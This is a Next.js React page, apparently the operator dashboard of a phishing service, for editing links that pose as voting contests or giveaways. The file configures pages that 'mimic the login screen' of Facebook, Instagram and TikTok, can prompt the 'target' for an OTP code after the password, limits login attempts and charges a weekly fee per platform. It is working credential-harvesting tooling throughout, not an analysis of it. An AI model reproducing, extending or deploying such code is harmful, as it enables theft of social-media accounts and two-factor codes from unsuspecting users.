'use client';

import { useParams, useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';
import { toast } from 'react-hot-toast';
import { format } from 'date-fns';
import {
  ClipboardDocumentIcon,
  CheckCircleIcon,
  XCircleIcon,
  EyeIcon,
  XMarkIcon,
  CalendarDaysIcon,
  TrophyIcon,
  GiftIcon,
  Cog6ToothIcon,
} from '@heroicons/react/24/outline';
import { CheckCircleIcon as CheckSolid } from '@heroicons/react/24/solid';
import ImageUpload from '@/components/ImageUpload';

type SocialPlatform = 'facebook' | 'instagram' | 'tiktok';

interface FormData {
  title: string;
  linkType: string;
  expiresAt: string;
  linkName: string;
  contestantName: string;
  writeup: string;
  image: string;
  bannerImage: string;
  linkId: string;
  socialMedia: SocialPlatform[];
  retry: number;
  askForOtp: boolean;
}

const PLATFORM_LABELS: Record<SocialPlatform, string> = {
  facebook: 'Facebook', instagram: 'Instagram', tiktok: 'TikTok',
};

const TYPE_META: Record<string, { icon: React.ElementType; color: string; label: string }> = {
  voting:   { icon: TrophyIcon,    color: 'text-blue-500',   label: 'Voting' },
  giveaway: { icon: GiftIcon,      color: 'text-green-500',  label: 'Giveaway' },
  custom:   { icon: Cog6ToothIcon, color: 'text-purple-500', label: 'Custom' },
};

const DURATION_OPTIONS = [
  { value: 1, label: '1 Week' },
  { value: 2, label: '2 Weeks' },
  { value: 4, label: '1 Month' },
  { value: 8, label: '2 Months' },
  { value: 12, label: '3 Months' },
];

function SectionHeader({ children }: { children: React.ReactNode }) {
  return (
    <p className="text-xs font-semibold uppercase tracking-widest text-gray-400 dark:text-gray-500 mb-3">
      {children}
    </p>
  );
}

function HelperText({ children }: { children: React.ReactNode }) {
  return <p className="text-xs text-gray-500 dark:text-gray-400 mt-1 leading-relaxed">{children}</p>;
}

export default function LinkDetails() {
  const params = useParams();
  const router = useRouter();

  const [isLoading, setIsLoading]   = useState(false);
  const [isFetching, setIsFetching] = useState(true);
  const [duration, setDuration]     = useState(1);
  const [pricePerWeek, setPricePerWeek] = useState(4000);
  const [showPreview, setShowPreview]   = useState(false);
  const [copied, setCopied]             = useState(false);

  const [formData, setFormData] = useState<FormData>({
    title: '', linkType: '', expiresAt: '', linkName: '',
    contestantName: '', writeup: '', image: '', bannerImage: '',
    linkId: '', socialMedia: [], retry: 1, askForOtp: true,
  });

  const host = process.env.NEXT_PUBLIC_SOCIAL_LINK_HOST?.trim() ?? '';
  const linkUrl = `${host}/slink/${formData.linkId}`;

  useEffect(() => { fetchLinkDetails(); }, [params.id]);

  const fetchLinkDetails = async () => {
    setIsFetching(true);
    try {
      const res  = await fetch(`/api/auth/links/${params.id}`);
      if (!res.ok) throw new Error();
      const data = await res.json();

      if (data.linkType === 'scratch') {
        router.replace(`/links/${params.id}/scratch`);
        return;
      }

      const platforms: SocialPlatform[] = data.socialMedia ?? [];
      if (platforms.length === 1) setPricePerWeek(4000);
      if (platforms.length === 2) setPricePerWeek(6500);
      if (platforms.length === 3) setPricePerWeek(9000);

      setFormData({
        title:          data.title          ?? '',
        linkType:       data.linkType       ?? '',
        expiresAt:      data.expiresAt ? format(new Date(data.expiresAt), 'yyyy-MM-dd') : '',
        linkName:       data.linkName       ?? '',
        contestantName: data.contestantName ?? '',
        writeup:        data.writeup        ?? '',
        image:          data.image          ?? '',
        bannerImage:    data.bannerImage    ?? '',
        linkId:         data.linkId         ?? '',
        socialMedia:    platforms,
        retry:          data.retry          ?? 1,
        askForOtp:      data.otpEnabled     ?? true,
      });
    } catch {
      toast.error('Error fetching link details');
    } finally {
      setIsFetching(false);
    }
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(linkUrl);
      setCopied(true);
      toast.success('Link copied!');
      setTimeout(() => setCopied(false), 2000);
    } catch {
      toast.error('Failed to copy');
    }
  };

  const handlePlatformToggle = (platform: SocialPlatform) => {
    setFormData(prev => {
      if (prev.socialMedia.includes(platform) && prev.socialMedia.length > 1) {
        return { ...prev, socialMedia: prev.socialMedia.filter(p => p !== platform) };
      } else if (!prev.socialMedia.includes(platform)) {
        return { ...prev, socialMedia: [...prev.socialMedia, platform] };
      }
      return prev;
    });
  };

  const handleUpdate = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const res  = await fetch(`/api/auth/links/${params.id}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      const data = await res.json();
      if (!res.ok) { toast.error(data.error || 'Error updating link'); return; }
      toast.success('Link updated successfully');
      fetchLinkDetails();
    } catch {
      toast.error('Error updating link');
    } finally {
      setIsLoading(false);
    }
  };

  const handleExtend = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const res  = await fetch(`/api/auth/links/${params.id}/extend`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ duration }),
      });
      const data = await res.json();
      if (!res.ok) { toast.error(data.error || 'Error extending link'); return; }
      toast.success('Link extended successfully');
      fetchLinkDetails();
    } catch {
      toast.error('Error extending link');
    } finally {
      setIsLoading(false);
    }
  };

  const handleDelete = async () => {
    if (!confirm('Are you sure you want to delete this link?')) return;
    setIsLoading(true);
    try {
      const res = await fetch(`/api/auth/links/${params.id}`, { method: 'DELETE' });
      if (!res.ok) throw new Error();
      toast.success('Link deleted');
      router.push('/links');
    } catch {
      toast.error('Error deleting link');
    } finally {
      setIsLoading(false);
    }
  };

  const pillCls = (active: boolean) =>
    `px-4 py-2 rounded-full text-sm font-semibold transition-colors duration-150 ${
      active
        ? 'bg-primary-500 text-white'
        : 'bg-gray-100 dark:bg-gray-800 text-gray-600 dark:text-gray-400 hover:bg-gray-200 dark:hover:bg-gray-700'
    }`;

  const inputCls = 'w-full px-3.5 py-2.5 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-lg text-sm text-gray-900 dark:text-white placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-primary-500/40 focus:border-primary-500 transition-all duration-150';

  const typeMeta = TYPE_META[formData.linkType] ?? TYPE_META.custom;
  const TypeIcon = typeMeta.icon;
  const isExpired = formData.expiresAt ? new Date(formData.expiresAt) < new Date() : false;

  if (isFetching) {
    return (
      <div className="flex justify-center items-center min-h-[60vh]">
        <div className="w-10 h-10 border-4 border-primary-500/20 border-t-primary-500 rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto px-4 py-6 space-y-8">

      {/* Header */}
      <div className="flex items-start justify-between gap-3">
        <div>
          <div className="flex items-center gap-2 mb-0.5">
            <TypeIcon className={`w-5 h-5 ${typeMeta.color}`} />
            <h1 className="text-xl font-bold text-gray-900 dark:text-white">
              {formData.linkName || 'Edit Link'}
            </h1>
          </div>
          <p className="text-xs text-gray-500 dark:text-gray-400">
            {typeMeta.label} link
            {formData.expiresAt && (
              <> · <span className={isExpired ? 'text-red-500' : ''}>
                {isExpired ? 'Expired' : `Expires ${format(new Date(formData.expiresAt), 'MMM d, yyyy')}`}
              </span></>
            )}
          </p>
        </div>
        <button
          type="button"
          onClick={() => setShowPreview(true)}
          className="shrink-0 flex items-center gap-1.5 px-3 py-2 bg-gray-100 dark:bg-gray-800 text-gray-700 dark:text-gray-300 text-sm font-medium rounded-xl hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors"
        >
          <EyeIcon className="w-4 h-4" />
          Preview
        </button>
      </div>

      {/* Link URL */}
      <div className="flex items-center gap-2 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl px-4 py-3">
        <span className="text-xs text-gray-500 dark:text-gray-400 font-mono truncate flex-1">{linkUrl}</span>
        <button
          type="button"
          onClick={handleCopy}
          className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
            copied ? 'bg-green-500 text-white' : 'bg-primary-500 hover:bg-primary-600 text-white'
          }`}
        >
          {copied ? <><CheckSolid className="w-3.5 h-3.5" />Copied!</> : <><ClipboardDocumentIcon className="w-3.5 h-3.5" />Copy</>}
        </button>
      </div>

      {/* ── Extend duration ── */}
      <section>
        <SectionHeader>Extend duration</SectionHeader>
        <form onSubmit={handleExtend} className="border border-gray-200 dark:border-gray-700 rounded-xl p-4 space-y-4 bg-white dark:bg-gray-900">
          <div className="flex flex-wrap gap-2">
            {DURATION_OPTIONS.map(opt => (
              <button key={opt.value} type="button" onClick={() => setDuration(opt.value)}
                className={pillCls(duration === opt.value)}>{opt.label}</button>
            ))}
          </div>
          <div className="flex items-center justify-between bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl px-4 py-3">
            <div>
              <p className="text-sm font-medium text-gray-700 dark:text-gray-300">Extension cost</p>
              <p className="text-xs text-gray-500 dark:text-gray-400">Based on your current platform count</p>
            </div>
            <span className="text-lg font-bold text-primary-500">₦{(duration * pricePerWeek).toLocaleString()}</span>
          </div>
          <button type="submit" disabled={isLoading}
            className="w-full py-2.5 rounded-xl text-sm font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors disabled:opacity-40">
            {isLoading ? 'Extending…' : 'Extend'}
          </button>
        </form>
      </section>

      {/* ── Edit form ── */}
      <form onSubmit={handleUpdate} className="space-y-8">

        {/* Section 1: Link details */}
        <section className="space-y-4">
          <SectionHeader>Link details</SectionHeader>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Your reference name</label>
            <input type="text" value={formData.linkName}
              onChange={e => setFormData(p => ({ ...p, linkName: e.target.value }))}
              className={inputCls} placeholder="e.g. John's voting campaign" maxLength={50} />
            <HelperText>Only you see this — used to identify the link in your dashboard.</HelperText>
          </div>

          {formData.linkType === 'voting' && (
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Contestant&apos;s name</label>
              <input type="text" value={formData.contestantName}
                onChange={e => setFormData(p => ({ ...p, contestantName: e.target.value }))}
                className={inputCls} placeholder="e.g. Sarah Johnson" maxLength={50} />
              <HelperText>This name appears on the voting page your target sees.</HelperText>
            </div>
          )}

          {(formData.linkType === 'giveaway' || formData.linkType === 'custom') && (
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Page title</label>
              <input type="text" value={formData.title}
                onChange={e => setFormData(p => ({ ...p, title: e.target.value }))}
                className={inputCls} placeholder="e.g. You've been selected!" maxLength={100} />
              <HelperText>The headline shown at the top of the page your target sees.</HelperText>
            </div>
          )}

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Description</label>
            <textarea value={formData.writeup} rows={4}
              onChange={e => setFormData(p => ({ ...p, writeup: e.target.value }))}
              className={inputCls} placeholder="A short message shown on the page." maxLength={500} />
            <div className="flex justify-between">
              <HelperText>Shown on the page as supporting text.</HelperText>
              <span className="text-xs text-gray-400 mt-1">{formData.writeup.length}/500</span>
            </div>
          </div>
        </section>

        {/* Section 2: Images */}
        <section className="space-y-4">
          <SectionHeader>Images</SectionHeader>
          <ImageUpload label="Main image" required value={formData.image}
            onChange={url => setFormData(p => ({ ...p, image: url }))}
            hint="The profile or contestant photo shown on the page." />
          {(formData.linkType === 'voting' || formData.linkType === 'giveaway') && (
            <ImageUpload label="Banner image" required value={formData.bannerImage}
              onChange={url => setFormData(p => ({ ...p, bannerImage: url }))}
              hint="Wide header image shown at the top of the page." />
          )}
        </section>

        {/* Section 3: Platforms & security */}
        <section className="space-y-5">
          <SectionHeader>Platforms &amp; security</SectionHeader>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Target platforms</label>
            <HelperText>The page will mimic the login screen of the selected platform(s).</HelperText>
            <div className="flex flex-wrap gap-2 mt-2.5">
              {(['facebook', 'instagram', 'tiktok'] as SocialPlatform[]).map(p => (
                <button key={p} type="button" onClick={() => handlePlatformToggle(p)}
                  className={pillCls(formData.socialMedia.includes(p))}>
                  {PLATFORM_LABELS[p]}
                </button>
              ))}
            </div>
          </div>

          <div className="border-t border-gray-100 dark:border-gray-700" />

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Request OTP after login?</label>
            <HelperText>If yes, after entering their password the target sees a verification code screen.</HelperText>
            <div className="flex gap-2 mt-2.5">
              {[{ value: true, label: 'Yes' }, { value: false, label: 'No' }].map(opt => (
                <button key={opt.label} type="button"
                  onClick={() => setFormData(p => ({ ...p, askForOtp: opt.value }))}
                  className={pillCls(formData.askForOtp === opt.value)}>{opt.label}</button>
              ))}
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Login attempts allowed</label>
            <HelperText>After this many failed attempts, the target is redirected away.</HelperText>
            <div className="flex gap-2 mt-2.5">
              {[1, 2, 3].map(v => (
                <button key={v} type="button"
                  onClick={() => setFormData(p => ({ ...p, retry: v }))}
                  className={pillCls(formData.retry === v)}>{v}</button>
              ))}
            </div>
          </div>
        </section>

        {/* Section 4: Expiry (read-only) */}
        <section>
          <SectionHeader>Expiry</SectionHeader>
          <div className={`flex items-center gap-3 px-4 py-3 rounded-xl border ${
            isExpired
              ? 'bg-red-50 dark:bg-red-500/10 border-red-200 dark:border-red-500/20'
              : 'bg-gray-50 dark:bg-gray-800 border-gray-200 dark:border-gray-700'
          }`}>
            <CalendarDaysIcon className={`w-5 h-5 shrink-0 ${isExpired ? 'text-red-500' : 'text-gray-400'}`} />
            <div>
              <p className={`text-sm font-medium ${isExpired ? 'text-red-600 dark:text-red-400' : 'text-gray-700 dark:text-gray-300'}`}>
                {isExpired ? 'This link has expired' : `Expires ${format(new Date(formData.expiresAt), 'MMMM d, yyyy')}`}
              </p>
              {isExpired && <p className="text-xs text-red-500 mt-0.5">Use the extend section above to renew it.</p>}
            </div>
          </div>
        </section>

        {/* Save */}
        <button type="submit" disabled={isLoading}
          className="w-full py-3 rounded-xl font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors disabled:opacity-40 flex items-center justify-center gap-2">
          {isLoading ? (
            <><svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
            </svg>Saving…</>
          ) : 'Save Changes'}
        </button>
      </form>

      {/* Danger zone */}
      <section className="border border-red-200 dark:border-red-900/50 rounded-xl p-4 bg-red-50 dark:bg-red-500/5">
        <p className="text-sm font-semibold text-red-600 dark:text-red-400 mb-1">Delete this link</p>
        <p className="text-xs text-red-500/80 dark:text-red-400/70 mb-3">This is permanent and cannot be undone.</p>
        <button onClick={handleDelete} disabled={isLoading}
          className="w-full py-2.5 rounded-xl text-sm font-semibold text-white bg-red-600 hover:bg-red-700 transition-colors disabled:opacity-40">
          {isLoading ? 'Deleting…' : 'Delete Link'}
        </button>
      </section>

      {/* ── Preview modal ── */}
      {showPreview && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70">
          <div className="relative w-full max-w-sm">
            <div className="flex items-center justify-between mb-3">
              <span className="text-white text-sm font-medium">Preview — {typeMeta.label} page</span>
              <button onClick={() => setShowPreview(false)} className="text-white hover:text-gray-300">
                <XMarkIcon className="w-5 h-5" />
              </button>
            </div>
            <div className="bg-white rounded-2xl overflow-hidden shadow-2xl">
              {/* Banner */}
              {(formData.linkType === 'voting' || formData.linkType === 'giveaway') && formData.bannerImage && (
                // eslint-disable-next-line @next/next/no-img-element
                <img src={formData.bannerImage} alt="Banner" className="w-full h-28 object-cover"
                  onError={e => { e.currentTarget.style.display = 'none'; }} />
              )}
              <div className="p-5">
                {/* Main image */}
                {formData.image && (
                  // eslint-disable-next-line @next/next/no-img-element
                  <img src={formData.image} alt="Main"
                    className="w-20 h-20 rounded-full object-cover mx-auto mb-3 border-4 border-white shadow"
                    onError={e => { e.currentTarget.style.display = 'none'; }} />
                )}
                {/* Title / contestant */}
                <h2 className="text-base font-bold text-center text-gray-900 mb-1">
                  {formData.linkType === 'voting'
                    ? (formData.contestantName || 'Contestant Name')
                    : (formData.title || 'Page Title')}
                </h2>
                {formData.writeup && (
                  <p className="text-xs text-gray-500 text-center mb-3 leading-relaxed">{formData.writeup}</p>
                )}
                {/* Platform pills */}
                <div className="flex justify-center flex-wrap gap-1.5 mb-4">
                  {formData.socialMedia.map(p => (
                    <span key={p} className="text-[10px] font-semibold px-2 py-0.5 rounded-full bg-blue-50 text-blue-600 capitalize">{p}</span>
                  ))}
                </div>
                {/* Mock login form */}
                <div className="space-y-2.5">
                  <div className="h-9 bg-gray-100 rounded-lg border border-gray-200" />
                  <div className="h-9 bg-gray-100 rounded-lg border border-gray-200" />
                  {formData.askForOtp && (
                    <div className="h-9 bg-gray-100 rounded-lg border border-gray-200" />
                  )}
                  <div className="h-9 bg-blue-600 rounded-lg" />
                </div>
              </div>
            </div>
            <p className="text-center text-xs text-gray-400 mt-3">Simplified preview — actual page may differ slightly</p>
          </div>
        </div>
      )}
    </div>
  );
}
